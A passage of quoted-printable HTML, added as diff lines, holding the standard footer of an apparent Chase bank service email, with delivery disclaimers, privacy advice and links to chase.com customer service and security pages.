+ata rates may apply.<BR style=3D"LINE-HEIGHT: normal !important"><BR style=
+=3D"LINE-HEIGHT: normal !important">This service email gives you updates an=
+d information about your Chase relationship.<BR style=3D"LINE-HEIGHT: norma=
+l !important"><BR style=3D"LINE-HEIGHT: normal !important">
+Chase cannot guarantee the delivery of alerts and notifications. Wireless o=
+r internet service provider outages or other circumstances could delay them=
+=2E You can always check chase.com or the Chase Mobile app for the status o=
+f your accounts including your latest account balances and transaction deta=
+ils.<BR style=3D"LINE-HEIGHT: normal !important"><BR style=3D"LINE-HEIGHT: =
+normal !important">
+To protect your personal information, please don't reply to this message. C=
+hase won't ask for confidential information in an email.<BR style=3D"LINE-H=
+EIGHT: normal !important"><BR style=3D"LINE-HEIGHT: normal !important">If y=
+ou have concerns about the authenticity of this message or have questions a=
+bout your account visit&nbsp;<A title=3D"Follow link" style=3D"COLOR: rgb(0=
+,105,166); LINE-HEIGHT: normal !important" href=3D"https://www.chase.com/di=
+gital/customer-service" target=3D_blank>
+ chase.com/CustomerService</A>&nbsp;for ways to contact us.<BR style=3D"LIN=
+E-HEIGHT: normal !important"><BR style=3D"LINE-HEIGHT: normal !important">Y=
+our privacy is important to us. See our online&nbsp;<A title=3D"Follow link=
+" style=3D"COLOR: rgb(0,105,166); LINE-HEIGHT: normal !important" href=3D"h=
+ttps://www.chase.com/digital/resources/privacy-security" target=3D_blank>Se=
+curity Center</A>&nbsp;to learn how to protect your information.<BR style=
+=3D"LINE-HEIGHT: normal !important">
+<BR style=3D"LINE-HEIGHT: normal !important">&copy; 2025 JPMorgan Chase &am=
+p; Co.</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY=
+></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TB=
+ODY></TABLE></BODY></HTML>
